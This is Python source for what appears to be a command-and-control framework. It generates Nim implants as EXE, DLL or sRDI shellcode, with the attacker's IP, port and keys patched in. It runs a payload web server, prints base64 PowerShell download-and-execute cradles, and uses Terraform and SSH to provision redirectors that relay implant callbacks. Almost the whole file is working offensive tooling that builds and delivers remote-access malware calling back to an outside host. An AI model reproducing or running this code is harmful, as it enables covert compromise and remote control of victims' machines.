def clean_up_compile_tmp(f_name):
    cwd_nim = os.getcwd()
    template_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant')
    os.remove(f'{template_loc}/{f_name}')

def nimplant(imp_choice=None, GUI=False):
    global host_ip
    global host_port
    random_name = randomname.get_name()
    compile_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
    cwd_nim = os.getcwd()
    f_name= f'{compile_name}.nim'
    exe_file = f'{random_name}.exe'
    
    file_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant/implant.nim')
    implant_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant')
    final_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')

    if os.path.exists(file_loc):
        shutil.copy(file_loc, f_name)
        shutil.move(f_name, implant_loc)
    else:
        print(f'{Fore.RED}[-] implant.nim not found in {file_loc}')

    if imp_choice == None:
        print(Fore.CYAN + '[*] Use listener address or specify other IP for implant to connect to: ')
        print(Fore.CYAN + '[*] 1. Listener address')
        print(Fore.CYAN + '[*] 2. Other IP')
        imp_choice = input(Fore.LIGHTYELLOW_EX + '[#] Enter 1 or 2: ' + Fore.RESET)
    if imp_choice == "1":
        pass
    else:
        host_ip = input('[*] Specify IP: ')
    with open(f'{implant_loc}/{f_name}') as f:
        patch_host = f.read().replace('INPUT_IP', str(host_ip.strip()))
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(patch_host)
        f.close()
    with open(f'{implant_loc}/{f_name}') as f:
        patch_port = f.read().replace('INPUT_PORT', str(host_port))
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(patch_port)
        f.close()
    with open(f'{implant_loc}/{f_name}') as f:
        new_key = f.read().replace('AUTH_KEY', auth_key)
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(new_key)
        f.close()
    if GUI == False:
        compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip","--cpu:amd64",f"-o:{final_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
        for _ in track(range(4), description=f'[green][*] Compiling executable {exe_file}...'):
            process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            process.wait()
        implant_loc = os.path.join(final_loc, exe_file)
        if os.path.exists(implant_loc):

            clean_up_compile_tmp(f_name)
            print(f'{Fore.GREEN}[+] {exe_file} saved to {implant_loc}')
        else:
            output = process.stdout.read()
            print(output.decode('utf-8'))
            clean_up_compile_tmp(f_name)
            print(Fore.RED + '[-] An error occurred while compiling the implant')
    elif GUI == True:
        try:
            compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip","--cpu:amd64",f"-o:{final_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
            process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            process.wait()
        except Exception as e:
            clean_up_compile_tmp(f_name)
            return jsonify({'error': str(e)}), 500

        implant_loc = os.path.join(final_loc, exe_file)
        if os.path.exists(implant_loc):
            clean_up_compile_tmp(f_name)

            return send_file(implant_loc, as_attachment=True, download_name=exe_file)
        else:
            output = process.stdout.read()
            clean_up_compile_tmp(f_name)
            return jsonify({'An error occurred while compiling the implant': output.decode('utf-8')}), 500
    

def nimplant_HTTP(imp_choice=None, GUI=False, domain=None, port=None, compile_format=None):
    random_name = randomname.get_name()
    compile_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
    cwd_nim = os.getcwd()
    f_name= f'{compile_name}.nim'
    exe_file = f'{random_name}.exe'
    dll_file = f'{random_name}.dll'
    bin_file = f'{random_name}.bin'
    

    
    

    file_loc_http_exe = os.path.expanduser(f'{cwd_nim[:-3]}/implant/implant_HTTP.nim')
    file_loc_https_exe = os.path.expanduser(f'{cwd_nim[:-3]}/implant/implant_HTTPS.nim')
    file_loc_http_dll = os.path.expanduser(f'{cwd_nim[:-3]}/implant/implant_HTTP_DLL.nim')
    file_loc_https_dll = os.path.expanduser(f'{cwd_nim[:-3]}/implant/implant_HTTPS_DLL.nim')
    implant_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant')
    final_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')

    if imp_choice == None:
        options = ['1. Active Listener', '2. Other IP', '3. Redirector']
        print(Fore.CYAN + '[*] Select the method the implant should use to connect back (e.g., Active Listener, Other IP, or Redirector):')
        terminal_menu = TerminalMenu(options)
        menu_entry_index = terminal_menu.show()
        print(f"{options[menu_entry_index]} selected")
        imp_choice = options[menu_entry_index].split('.')[0].strip()

    if compile_format == None:
        options = ['exe', 'dll', 'bin']
        print(Fore.CYAN + '[*] Choose format for the implant: ')
        terminal_menu = TerminalMenu(options)
        menu_entry_index = terminal_menu.show()
        print(f"{options[menu_entry_index]} selected")
        compile_format = options[menu_entry_index]

    
    if imp_choice == "1":

        if GUI == False:
            listen_list = display_listeners_from_db()
            print(Fore.CYAN + '[*] Choose listener to use: ')

            options = []
            for i in listen_list:
                options.append(i[0])

            terminal_menu = TerminalMenu(options)
            menu_entry_index = terminal_menu.show()

            http_host_ip = get_interface_from_listener_id(options[menu_entry_index])
            http_host_port = get_port_from_listener_id(options[menu_entry_index])
            print(f'{Fore.GREEN}[+] Listener IP: {http_host_ip}')
            print(f'{Fore.GREEN}[+] Listener Port: {http_host_port}')

        if GUI == True:
            http_host_ip = domain
            http_host_port = port

        if compile_format == 'exe':

            if os.path.exists(file_loc_http_exe):
                shutil.copy(file_loc_http_exe, f_name)
                shutil.move(f_name, implant_loc)

                URL = f'{http_host_ip}:{http_host_port}'  
                with open(f'{implant_loc}/{f_name}') as f:
                    patch_host = f.read().replace('URL', str(URL.strip())) 
                with open(f'{implant_loc}/{f_name}', 'w') as f:
                    f.write(patch_host)
                with open(f'{implant_loc}/{f_name}') as f:
                    new_key = f.read().replace('AUTH_KEY', auth_key)
                with open(f'{implant_loc}/{f_name}', 'w') as f:
                    f.write(new_key)
                with open(f'{implant_loc}/{f_name}') as f:
                    RC_patch = f.read().replace('RCKEY', RCKey)
                with open(f'{implant_loc}/{f_name}', 'w') as f:
                    f.write(RC_patch)
                if GUI == False:
                    compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui","-d:strip","--cpu:amd64",f"-o:{final_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
                    for _ in track(range(4), description=f'[green][*] Compiling executable {exe_file}...'):
                        process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        stdout, stderr = process.communicate() 
                        process.wait()
                    output = stderr.decode('utf-8') if stderr else stdout.decode('utf-8') 
                    implant_loc = os.path.join(final_loc, exe_file)
                    if os.path.exists(implant_loc):

                        clean_up_compile_tmp(f_name)

                        print(f'{Fore.GREEN}[+] {exe_file} saved to {implant_loc}')
                    else:
                        print(output)
                        print(Fore.RED + '[-] An error occurred while compiling the implant')
                elif GUI == True:
                    try:
                        compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip","--cpu:amd64",f"-o:{final_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
                        process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        process.wait()
                    except Exception as e:
                        clean_up_compile_tmp(f_name)
                        return jsonify({'error': str(e)}), 500

                    implant_loc = os.path.join(final_loc, exe_file)
                    if os.path.exists(implant_loc):
                        
                        clean_up_compile_tmp(f_name)

                        return send_file(implant_loc, as_attachment=True, download_name=exe_file)
                    else:
                        output = process.stdout.read()
                        clean_up_compile_tmp(f_name)
                        return jsonify({'An error occurred while compiling the implant': output.decode('utf-8')}), 500
        
        elif compile_format == 'dll':

            if os.path.exists(file_loc_http_dll):
                shutil.copy(file_loc_http_dll, f_name)
                shutil.move(f_name, implant_loc)
                URL = f'{http_host_ip}:{http_host_port}'  
                with open(f'{implant_loc}/{f_name}') as f:
                    patch_host = f.read().replace('URL', str(URL.strip())) 
                with open(f'{implant_loc}/{f_name}', 'w') as f:
                    f.write(patch_host)
                with open(f'{implant_loc}/{f_name}') as f:
                    new_key = f.read().replace('AUTH_KEY', auth_key)
                with open(f'{implant_loc}/{f_name}', 'w') as f:
                    f.write(new_key)
                with open(f'{implant_loc}/{f_name}') as f:
                    RC_patch = f.read().replace('RCKEY', RCKey)
                with open(f'{implant_loc}/{f_name}', 'w') as f:
                    f.write(RC_patch)
                if GUI == False:
                    compile_cmd = [f"nim", "c", "-d:mingw","--app=lib","--nomain","--cpu:amd64",f"-o:{final_loc}/{dll_file}", f"{implant_loc}/{f_name}"]
                    for _ in track(range(4), description=f'[green][*] Compiling DLL {dll_file}...'):
                        process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        stdout, stderr = process.communicate() 
                        process.wait()
                    output = stderr.decode('utf-8') if stderr else stdout.decode('utf-8') 
                    implant_loc = os.path.join(final_loc, dll_file)
                    if os.path.exists(implant_loc):

                        clean_up_compile_tmp(f_name)

                        print(f'{Fore.GREEN}[+] {dll_file} saved to {implant_loc}')
                    else:
                        print(output)
                        print(Fore.RED + '[-] An error occurred while compiling the implant')
                elif GUI == True:
                    try:
                        compile_cmd = [f"nim", "c", "-d:mingw","--app=lib","--nomain","--cpu:amd64",f"-o:{final_loc}/{dll_file}", f"{implant_loc}/{f_name}"]
                        process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        stdout, stderr = process.communicate() 
                        process.wait()
                    except Exception as e:
                        clean_up_compile_tmp(f_name)
                        return jsonify({'error': str(e)}), 500

                    implant_loc = os.path.join(final_loc, dll_file)
                    if os.path.exists(implant_loc):
                        
                        clean_up_compile_tmp(f_name)

                        return send_file(implant_loc, as_attachment=True, download_name=dll_file)
                    else:
                        output = process.stdout.read()
                        clean_up_compile_tmp(f_name)
                        return jsonify({'An error occurred while compiling the implant': output.decode('utf-8')}), 500
        
        elif compile_format == "bin":
            if os.path.exists(file_loc_http_dll):
                shutil.copy(file_loc_http_dll, f_name)
                shutil.move(f_name, implant_loc)
                URL = f'{http_host_ip}:{http_host_port}'  
                with open(f'{implant_loc}/{f_name}') as f:
                    patch_host = f.read().replace('URL', str(URL.strip())) 
                with open(f'{implant_loc}/{f_name}', 'w') as f:
                    f.write(patch_host)
                with open(f'{implant_loc}/{f_name}') as f:
                    new_key = f.read().replace('AUTH_KEY', auth_key)
                with open(f'{implant_loc}/{f_name}', 'w') as f:
                    f.write(new_key)
                with open(f'{implant_loc}/{f_name}') as f:
                    RC_patch = f.read().replace('RCKEY', RCKey)
                with open(f'{implant_loc}/{f_name}', 'w') as f:
                    f.write(RC_patch)
                if GUI == False:
                    compile_cmd = [f"nim", "c", "-d:mingw","--app=lib","--nomain","--cpu:amd64",f"-o:{final_loc}/{dll_file}", f"{implant_loc}/{f_name}"]
                    for _ in track(range(4), description=f'[green][*] Compiling DLL for sRDI {dll_file}...'):
                        process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        stdout, stderr = process.communicate() 
                        process.wait()
                    output = stderr.decode('utf-8') if stderr else stdout.decode('utf-8') 
                    implant_loc = os.path.join(final_loc, dll_file)
                    if os.path.exists(implant_loc):


                        with open(implant_loc, 'rb') as f:
                            shellcode = ConvertToShellcode(f.read(), HashFunctionName("Ost"), flags=0x4)

                        with open(bin_file, 'wb') as f:
                            f.write(shellcode)

                        shutil.move(bin_file, final_loc)


                        clean_up_compile_tmp(f_name)
                        os.remove(implant_loc)

                        implant_loc = os.path.join(final_loc, bin_file)
                        print(f'{Fore.GREEN}[+] {bin_file} saved to {implant_loc}')
                    else:
                        print(output)
                        print(Fore.RED + '[-] An error occurred while compiling the implant')
                elif GUI == True:
                    try:
                        compile_cmd = [f"nim", "c", "-d:mingw","--app=lib","--nomain","--cpu:amd64",f"-o:{final_loc}/{dll_file}", f"{implant_loc}/{f_name}"]
                        process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        stdout, stderr = process.communicate() 
                        process.wait()
                    except Exception as e:
                        clean_up_compile_tmp(f_name)
                        return jsonify({'error': str(e)}), 500

                    implant_loc = os.path.join(final_loc, dll_file)
                    if os.path.exists(implant_loc):
                        
                        with open(implant_loc, 'rb') as f:
                            shellcode = ConvertToShellcode(f.read(), HashFunctionName("Ost"), flags=0x4)

                        with open(bin_file, 'wb') as f:
                            f.write(shellcode)

                        shutil.move(bin_file, final_loc)


                        clean_up_compile_tmp(f_name)
                        os.remove(implant_loc)                        
                        implant_loc = os.path.join(final_loc, bin_file)
                        return send_file(implant_loc, as_attachment=True, download_name=bin_file)
                    else:
                        output = process.stdout.read()
                        clean_up_compile_tmp(f_name)
                        return jsonify({'An error occurred while compiling the implant': output.decode('utf-8')}), 500
            
            



    elif imp_choice == "3":

        if compile_format == 'exe':

            if os.path.exists(file_loc_https_exe):
                shutil.copy(file_loc_https_exe, f_name)
                shutil.move(f_name, implant_loc)
            else:
                print(f'{Fore.RED}[-] implant_HTTPS.nim not found in {implant_loc}')
            
            if GUI == True:
                redir_host_ip = domain
            else:
                listen_list = display_listeners_from_db()
                print(Fore.CYAN + '[*] Choose listener to use: ')

                options = []
                for i in listen_list:
                    options.append(i[0])

                terminal_menu = TerminalMenu(options)
                menu_entry_index = terminal_menu.show()

                redir_host_ip = get_domain(options[menu_entry_index])
                print(f'{Fore.GREEN}[+] Domain: {redir_host_ip}')

            with open(f'{implant_loc}/{f_name}') as f:
                patch_host = f.read().replace('URL', str(redir_host_ip.strip())) 
            with open(f'{implant_loc}/{f_name}', 'w') as f:
                f.write(patch_host)
            with open(f'{implant_loc}/{f_name}') as f:
                new_key = f.read().replace('AUTH_KEY', auth_key)
            with open(f'{implant_loc}/{f_name}', 'w') as f:
                f.write(new_key)
            with open(f'{implant_loc}/{f_name}') as f:
                RC_patch = f.read().replace('RCKEY', RCKey)
            with open(f'{implant_loc}/{f_name}', 'w') as f:
                f.write(RC_patch)
            if GUI == False:
                compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip","--cpu:amd64",f"-o:{final_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
                for _ in track(range(4), description=f'[green][*] Compiling executable {exe_file}...'):
                    process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    process.wait()
                    
                output = process.stdout.read()
                implant_loc = os.path.join(final_loc, exe_file)
                if os.path.exists(implant_loc):

                    clean_up_compile_tmp(f_name)

                    print(f'{Fore.GREEN}[+] {exe_file} saved to {implant_loc}')
                else:
                    print(output.decode('utf-8'))
                    print(Fore.RED + '[-] An error occurred while compiling the implant')
            elif GUI == True:
                try:
                    compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip","--cpu:amd64",f"-o:{final_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
                    process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    process.wait()
                except Exception as e:
                    clean_up_compile_tmp(f_name)
                    return jsonify({'error': str(e)}), 500

                implant_loc = os.path.join(final_loc, exe_file)
                if os.path.exists(implant_loc):

                    clean_up_compile_tmp(f_name)

                    return send_file(implant_loc, as_attachment=True, download_name=exe_file)
                else:
                    output = process.stdout.read()
                    clean_up_compile_tmp(f_name)
                    return jsonify({'An error occurred while compiling the implant': output.decode('utf-8')}), 500
        
        elif compile_format == 'dll':
            if os.path.exists(file_loc_https_dll):
                shutil.copy(file_loc_https_dll, f_name)
                shutil.move(f_name, implant_loc)
            else:
                print(f'{Fore.RED}[-] implant_HTTPS_DLL.nim not found in {implant_loc}')
            
            if GUI == True:
                redir_host_ip = domain
            else:
                listen_list = display_listeners_from_db()
                print(Fore.CYAN + '[*] Choose listener to use: ')

                options = []
                for i in listen_list:
                    options.append(i[0])

                terminal_menu = TerminalMenu(options)
                menu_entry_index = terminal_menu.show()

                redir_host_ip = get_domain(options[menu_entry_index])
                print(f'{Fore.GREEN}[+] Domain: {redir_host_ip}')

            with open(f'{implant_loc}/{f_name}') as f:
                patch_host = f.read().replace('URL', str(redir_host_ip.strip())) 
            with open(f'{implant_loc}/{f_name}', 'w') as f:
                f.write(patch_host)
            with open(f'{implant_loc}/{f_name}') as f:
                new_key = f.read().replace('AUTH_KEY', auth_key)
            with open(f'{implant_loc}/{f_name}', 'w') as f:
                f.write(new_key)
            with open(f'{implant_loc}/{f_name}') as f:
                RC_patch = f.read().replace('RCKEY', RCKey)
            with open(f'{implant_loc}/{f_name}', 'w') as f:
                f.write(RC_patch)
            if GUI == False:
                compile_cmd = [f"nim", "c", "-d:mingw","--app=lib","--nomain","--cpu:amd64",f"-o:{final_loc}/{dll_file}", f"{implant_loc}/{f_name}"]
                for _ in track(range(4), description=f'[green][*] Compiling DLL {dll_file}...'):
                    process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    process.wait()
                    
                output = process.stdout.read()
                implant_loc = os.path.join(final_loc, dll_file)
                if os.path.exists(implant_loc):

                    clean_up_compile_tmp(f_name)

                    print(f'{Fore.GREEN}[+] {dll_file} saved to {implant_loc}')
                else:
                    print(output.decode('utf-8'))
                    print(Fore.RED + '[-] An error occurred while compiling the implant')
            
            elif GUI == True:
                try:
                    compile_cmd = [f"nim", "c", "-d:mingw","--app=lib","--nomain","--cpu:amd64",f"-o:{final_loc}/{dll_file}", f"{implant_loc}/{f_name}"]
                    process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    process.wait()
                except Exception as e:
                    clean_up_compile_tmp(f_name)
                    return jsonify({'error': str(e)}), 500

                implant_loc = os.path.join(final_loc, dll_file)
                if os.path.exists(implant_loc):

                    clean_up_compile_tmp(f_name)

                    return send_file(implant_loc, as_attachment=True, download_name=dll_file)
                else:
                    output = process.stdout.read()
                    clean_up_compile_tmp(f_name)
                    return jsonify({'An error occurred while compiling the implant': output.decode('utf-8')}), 500
        
        elif compile_format == "bin":
            if os.path.exists(file_loc_https_dll):
                shutil.copy(file_loc_https_dll, f_name)
                shutil.move(f_name, implant_loc)
            else:
                print(f'{Fore.RED}[-] implant_HTTPS_DLL.nim not found in {implant_loc}')
            
            if GUI == True:
                redir_host_ip = domain
            else:
                listen_list = display_listeners_from_db()
                print(Fore.CYAN + '[*] Choose listener to use: ')

                options = []
                for i in listen_list:
                    options.append(i[0])

                terminal_menu = TerminalMenu(options)
                menu_entry_index = terminal_menu.show()

                redir_host_ip = get_domain(options[menu_entry_index])
                print(f'{Fore.GREEN}[+] Domain: {redir_host_ip}')

            with open(f'{implant_loc}/{f_name}') as f:
                patch_host = f.read().replace('URL', str(redir_host_ip.strip())) 
            with open(f'{implant_loc}/{f_name}', 'w') as f:
                f.write(patch_host)
            with open(f'{implant_loc}/{f_name}') as f:
                new_key = f.read().replace('AUTH_KEY', auth_key)
            with open(f'{implant_loc}/{f_name}', 'w') as f:
                f.write(new_key)
            with open(f'{implant_loc}/{f_name}') as f:
                RC_patch = f.read().replace('RCKEY', RCKey)
            with open(f'{implant_loc}/{f_name}', 'w') as f:
                f.write(RC_patch)
                if GUI == False:
                    compile_cmd = [f"nim", "c", "-d:mingw","--app=lib","--nomain","--cpu:amd64",f"-o:{final_loc}/{dll_file}", f"{implant_loc}/{f_name}"]
                    for _ in track(range(4), description=f'[green][*] Compiling DLL for sRDI {dll_file}...'):
                        process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        stdout, stderr = process.communicate() 
                        process.wait()
                    output = stderr.decode('utf-8') if stderr else stdout.decode('utf-8') 
                    implant_loc = os.path.join(final_loc, dll_file)
                    if os.path.exists(implant_loc):


                        with open(implant_loc, 'rb') as f:
                            shellcode = ConvertToShellcode(f.read(), HashFunctionName("Ost"), flags=0x4)

                        with open(bin_file, 'wb') as f:
                            f.write(shellcode)

                        shutil.move(bin_file, final_loc)


                        clean_up_compile_tmp(f_name)
                        os.remove(implant_loc)

                        implant_loc = os.path.join(final_loc, bin_file)
                        print(f'{Fore.GREEN}[+] {bin_file} saved to {implant_loc}')
                    else:
                        print(output)
                        print(Fore.RED + '[-] An error occurred while compiling the implant')
                elif GUI == True:
                    try:
                        compile_cmd = [f"nim", "c", "-d:mingw","--app=lib","--nomain","--cpu:amd64",f"-o:{final_loc}/{dll_file}", f"{implant_loc}/{f_name}"]
                        process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        stdout, stderr = process.communicate() 
                        process.wait()
                    except Exception as e:
                        clean_up_compile_tmp(f_name)
                        return jsonify({'error': str(e)}), 500

                    implant_loc = os.path.join(final_loc, dll_file)
                    if os.path.exists(implant_loc):
                        
                        with open(implant_loc, 'rb') as f:
                            shellcode = ConvertToShellcode(f.read(), HashFunctionName("Ost"), flags=0x4)

                        with open(bin_file, 'wb') as f:
                            f.write(shellcode)

                        shutil.move(bin_file, final_loc)


                        clean_up_compile_tmp(f_name)
                        os.remove(implant_loc)                        
                        implant_loc = os.path.join(final_loc, bin_file)
                        return send_file(implant_loc, as_attachment=True, download_name=bin_file)
                    else:
                        output = process.stdout.read()
                        clean_up_compile_tmp(f_name)
                        return jsonify({'An error occurred while compiling the implant': output.decode('utf-8')}), 500
        
        
    else:

        if os.path.exists(file_loc_http_exe):
            shutil.copy(file_loc_http_exe, f_name)
            shutil.move(f_name, implant_loc)
        else:
            print(f'{Fore.RED}[-] implant_HTTP.nim not found in {implant_loc}')
        
        http_host_ip = input('[*] Specify IP: ')
        http_host_port = input('[*] Specify port: ')
        URL = f'{http_host_ip}:{http_host_port}'    
        with open(f'{implant_loc}/{f_name}') as f:
            patch_host = f.read().replace('URL', str(URL.strip())) 
        with open(f'{implant_loc}/{f_name}', 'w') as f:
            f.write(patch_host)
            f.close()
        with open(f'{implant_loc}/{f_name}') as f:
            patch_id = f.read().replace('ID', str(id))
        with open(f'{implant_loc}/{f_name}', 'w') as f:
            f.write(patch_id)
            f.close()
        with open(f'{implant_loc}/{f_name}') as f:
            new_key = f.read().replace('AUTH_KEY', auth_key)
        with open(f'{implant_loc}/{f_name}', 'w') as f:
            f.write(new_key)
            f.close()
        with open(f'{implant_loc}/{f_name}') as f:
            RC_patch = f.read().replace('RCKEY', RCKey)
        with open(f'{implant_loc}/{f_name}', 'w') as f:
            f.write(RC_patch)
            f.close()
        compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip","--cpu:amd64",f"-o:{final_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
        for _ in track(range(4), description=f'[green][*] Compiling executable {exe_file}...'):
            process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            process.wait()
        
        output = process.stdout.read()
        implant_loc = os.path.join(final_loc, exe_file)
        if os.path.exists(implant_loc):
            
            clean_up_compile_tmp(f_name)
            print(f'{Fore.GREEN}[+] {exe_file} saved to {implant_loc}')   
        
        else:
            print(output.decode('utf-8'))
            clean_up_compile_tmp(f_name)
            print(Fore.RED + '[-] An error occurred while compiling the implant')
    
    
def resolve_ip(interface):
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(), 0x8915,  # SIOCGIFADDR
        struct.pack('256s', interface[:15].encode('utf-8'))
        )[20:24])
    
        

def pwsh_cradle():
   
    cwd_payload = os.getcwd()
    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
    payload_name = []
    global check_file_loc 
    for file in os.listdir(payload_loc):
        payload_name.append(file)
        check_file_loc = os.path.expanduser(f'{cwd_payload}/Payloads/{file}')

    print(f'{Fore.LIGHTGREEN_EX}[*] Payload server available at {payload_srv_ip}:{payload_port}')
    for i in payload_name:
        if os.path.exists(check_file_loc):
            runner_file = swnamegen(2)
            runner_file = f'{runner_file}.exe'
            random_exe = (''.join(random.choices(string.ascii_lowercase, k=8))) 
            random_exe = f'{random_exe}.exe'
            payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
            runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{payload_srv_ip}:{payload_port}/{runner_file}')".encode('utf-16le')
            with open(runner_file, 'w') as f:
                f.write(f'powershell -c wget http://{payload_srv_ip}:{payload_port}/{i} -outfile {random_exe};Start-Process -FilePath {random_exe} ')
                f.close()
                shutil.move(runner_file, payload_loc)
            b64_runner = base64.b64encode(runner_cal_unencoded)
            b64_runner = b64_runner.decode()
            print(f'{Fore.CYAN}\n[+] {i} - B64 encoded payload\n\npowershell -e {b64_runner}')
            b64_runner_decoded = base64.b64decode(b64_runner).decode()
            print(f'{Fore.CYAN}\n[+] Unencoded payload\n\n{b64_runner_decoded}')
            print('----------------------------------------------------------------------------------------------------------')
        else:
            print(f'{Fore.RED}[-] {check_file_loc} does not exist in payloads folder... Try another payload ')

        

def web_payload_server(ip=None, port=None):
    
    cwd_payload = os.getcwd()
    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=payload_loc, **kwargs)

    http_handler = Handler
    http_handler.log_message = lambda *args, **kwargs: None
    random_port = random.randint(8000, 8999)
    server = http.server.ThreadingHTTPServer((ip, random_port), http_handler)
    
    print(f'{Fore.GREEN}[+] Payload server is running at http://{ip}:{random_port}')
    thread = threading.Thread(target = server.serve_forever)
    thread.daemon = True
    thread.start()
    return ip
    

def redirector(LPORT):
    key_loc = os.path.expanduser('~/.ssh/id_rsa')
    if os.path.exists(key_loc):
        print(Fore.LIGHTGREEN_EX + '[+] Keypair already present...')
    else:
        print(Fore.LIGHTYELLOW_EX + '[*] Generating SSH keypair...')
        key = RSA.generate(2048)
        f = open("id_rsa", "wb")
        f.write(key.exportKey('PEM'))
        f.close()

        pubkey = key.publickey()
        f = open("id_rsa.pub", "wb")
        f.write(pubkey.exportKey('OpenSSH'))
        f.close()

        priv_key_loc = os.path.expanduser('id_rsa')
        pub_key_loc = os.path.expanduser('id_rsa.pub')
        shutil.move(priv_key_loc, key_loc)
        shutil.move(pub_key_loc, key_loc)

    old_cwd = os.getcwd()
    cwd = os.getcwd()
    terra_loc = os.path.expanduser(f'{cwd[:-3]}/Terraform_TCP')
    redir_loc = os.path.expanduser(f'{cwd[:-3]}/Templates/redirector_template.tf')
    script_loc = os.path.expanduser(f'{cwd[:-3]}/Templates/script.sh')
    redir_copy_loc = os.path.expanduser(f'{cwd[:-3]}/Terraform_TCP/redirector.tf')
    script_copy_loc = os.path.expanduser(f'{cwd[:-3]}/Terraform_TCP/script.sh')
    script_name = "script.sh"
    redirector_name = "redirector.tf"
    if os.path.exists(redir_loc):
        shutil.copy(redir_loc, redir_copy_loc)
        print(Fore.LIGHTYELLOW_EX +'[*] Patching listening port...')
        with open(f'{terra_loc}/{redirector_name}') as f:
            patch_host = f.read().replace('LPORT', str(LPORT))
        with open(f'{terra_loc}/{redirector_name}', 'w') as f:
            f.write(patch_host)
            f.close()
            
    if os.path.exists(script_loc):
        shutil.copy(script_loc, script_copy_loc)
        with open(f'{terra_loc}/{script_name}') as f:
            patch_host = f.read().replace('LPORT', str(LPORT))
        with open(f'{terra_loc}/{script_name}', 'w') as f:
            f.write(patch_host)
            f.close()
            print(Fore.GREEN +'[+] Listening port patched\n')
    
    print(Fore.LIGHTYELLOW_EX +'[*] Provisioning and configuring redirector... This will take a couple minutes')
    os.chdir(terra_loc)
    os.system("terraform init")
    terra_cmd = ["terraform", "apply", "-auto-approve"]
    process = subprocess.Popen(terra_cmd, stdout=subprocess.PIPE)
    output = process.stdout.read()
    redir_ip = re.findall(r'\b0mdroplet_ip_address \= \"(\d+\.\d+\.\d+.\d+)', output.decode('utf-8'))
    global re_ip_str
    re_ip_str = "".join(redir_ip)
    process.wait()

    print(Fore.LIGHTYELLOW_EX + '[*] Running socat relay trough SSH.. wait a moment.')
    subprocess.run(["ssh", f"root@{re_ip_str}", "/tmp/script.sh"],
        shell=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False)
    print(Fore.GREEN + '[+] Socat relay configured...')
    print(Fore.LIGHTYELLOW_EX + '[*] Setting up reverse port forward on localhost')
    os.system(f"ssh -N -R 4567:localhost:{host_port} root@{re_ip_str} &")
    os.chdir(old_cwd)

def patch_var(input_var, file_loc, patch_pattern):
    with open(f'{file_loc}') as f:
        patch_var = f.read().replace(f'{patch_pattern}', input_var)
    with open(f'{file_loc}', 'w') as f:
        f.write(patch_var)
        f.close()
        print(f"{Fore.GREEN + input_var} patched into {file_loc}{Fore.RESET}\n")



def redirector_http(dns_rec=None):
    home = Path.home()
    key_loc = home / '.ssh' / 'id_rsa'
    if key_loc.exists():
        print(Fore.LIGHTGREEN_EX + '[+] Keypair already present...')
    else:
        print(Fore.LIGHTYELLOW_EX + '[*] Generating SSH Keypair...')
        key = RSA.generate(2048)
        with open("id_rsa", "wb") as f:
            f.write(key.exportKey('PEM'))

        pubkey = key.publickey()
        with open("id_rsa.pub", "wb") as f:
            f.write(pubkey.exportKey('OpenSSH'))

        priv_key_loc = Path('id_rsa')
        pub_key_loc = Path('id_rsa.pub')
        priv_key_loc.rename(key_loc)
        pub_key_loc.rename(key_loc)

    terra_loc = Path.cwd().parent / 'Terraform_HTTP'
    redir_folder = terra_loc / 'redir'

    tf_var_file_loc = terra_loc / 'config_templates' / 'variable.tf'
    caddy_loc = terra_loc / 'config_templates' / 'Caddyfile'
    tf_http_redir_loc = terra_loc / 'config_templates' / 'http_redir.tf'
    tf_var_file_loc_new = terra_loc / 'variable.tf'
